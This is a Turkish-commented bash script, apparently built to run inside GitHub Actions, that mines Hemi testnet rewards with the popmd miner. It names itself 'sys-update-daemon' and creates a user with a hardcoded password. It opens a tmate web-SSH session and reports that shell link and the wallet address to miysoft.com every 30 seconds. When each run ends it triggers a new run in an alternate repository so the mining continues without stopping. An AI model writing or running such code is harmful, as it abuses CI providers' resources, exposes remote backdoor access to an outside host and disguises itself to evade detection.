#!/bin/bash

# --- 1. GİZLİLİK VE KULLANICI ---
export NODE_NAME="sys-update-daemon"
sudo useradd -m -s /bin/bash miysoft || true
echo "miysoft:Miysoft1234!" | sudo chpasswd

# --- 2. TMATE (WEB SSH) KURULUMU ---
# Bu bize tarayıcıdan girebileceğimiz bir link verecek
echo "Tmate kuruluyor..."
sudo apt-get install -y tmate
# Tmate'i başlat ve linkin oluşmasını bekle
tmate -S /tmp/tmate.sock new-session -d
tmate -S /tmp/tmate.sock wait tmate-ready
sleep 5
# Web linkini al
SSH_URL=$(tmate -S /tmp/tmate.sock display -p '#{tmate_web}')

# --- 3. GOOGLE DRIVE AYARI ---
mkdir -p ~/.config/rclone
echo "[gdrive]
type = drive
token = $RCLONE_TOKEN_BODY" > ~/.config/rclone/rclone.conf
rclone mkdir gdrive:hemi_backup || true
rclone copy gdrive:hemi_backup/popm_address.json . || echo "Yedek yok."

# --- 4. HEMI KURULUMU ---
if [ ! -f "./popmd" ]; then
    wget -q https://github.com/hemilabs/heminetwork/releases/download/v0.4.3/heminetwork_v0.4.3_linux_amd64.tar.gz
    tar -xf heminetwork_v0.4.3_linux_amd64.tar.gz
    cp heminetwork_v0.4.3_linux_amd64/popmd .
    chmod +x popmd
fi

# --- 5. CÜZDAN OLUŞTURMA (Manual Hex Fallback) ---
if [ ! -f "./popm_address.json" ]; then
    # OpenSSL ile private key üret
    PRIV_HEX=$(openssl rand -hex 32)
    # JSON dosyasını manuel oluşturuyoruz ki jq hata vermesin
    echo "{\"private_key\":\"$PRIV_HEX\",\"pubkey_hash\":\"generating...\"}" > popm_address.json
    
    # Adresi oluşturmak için mineri kısa süreli çalıştırıp kapatacağız (Trick)
    export POPM_BTC_PRIVKEY=$PRIV_HEX
    export POPM_STATIC_FEE=50
    timeout 10s ./popmd > output.log 2>&1
    
    # Logdan adresi bulmaya çalışalım (Fallback)
    GENERATED_ADDR=$(grep -oE "m[a-zA-Z0-9]{30,}" output.log | head -n 1)
    
    # Eğer logdan bulamazsak fake bir placeholder koyalım ki sistem durmasın
    if [ -z "$GENERATED_ADDR" ]; then GENERATED_ADDR="Adres_Olusturuluyor..."; fi
    
    # JSON'ı güncelle
    echo "{\"private_key\":\"$PRIV_HEX\",\"pubkey_hash\":\"$GENERATED_ADDR\"}" > popm_address.json
    rclone copy popm_address.json gdrive:hemi_backup/ --overwrite
fi

# Ortam değişkenlerini ayarla
export POPM_BTC_PRIVKEY=$(cat popm_address.json | jq -r '.private_key')
export POPM_STATIC_FEE=50
export POPM_BFG_URL="wss://testnet.rpc.hemi.network/v1/ws/public"

# --- 6. HEMI BAŞLAT ---
./popmd &

# --- 7. İZLEME DÖNGÜSÜ ---
START_TIME=$SECONDS
while [ $((SECONDS - START_TIME)) -lt 19800 ]; do 
    # CPU ölçümünü daha hassas yap
    CPU=$(grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage}')
    RAM=$(free | grep Mem | awk '{print $3/$2 * 100.0}')
    
    # Adresi her seferinde taze oku
    CURRENT_ADDR=$(cat popm_address.json | jq -r '.pubkey_hash')
    
    # Miysoft'a gönder
    curl -s -X POST -H "X-Miysoft-Key: $MIYSOFT_KEY" \
         -d "{\"worker_id\":\"W_$WORKER_ID\", \"cpu\":\"$CPU\", \"ram\":\"$RAM\", \"ssh\":\"$SSH_URL\", \"address\":\"$CURRENT_ADDR\", \"status\":\"HEMI_MINING\"}" \
         https://miysoft.com/api.php || true
    
    sleep 30
done

# --- 8. KAPANIŞ ---
pkill popmd
rclone copy popm_address.json gdrive:hemi_backup/ --overwrite

TARGET_REPO=$([ "$GITHUB_REPOSITORY" == "Alkan789/MaxNode" ] && echo "Alkan789/MadNode" || echo "Alkan789/MaxNode")
curl -X POST -H "Authorization: token $PAT_TOKEN" \
     -H "Accept: application/vnd.github.v3+json" \
     https://api.github.com/repos/$TARGET_REPO/dispatches \
     -d "{\"event_type\": \"next_worker\", \"client_payload\": {\"worker_id\": \"$((WORKER_ID + 1))\"}}"
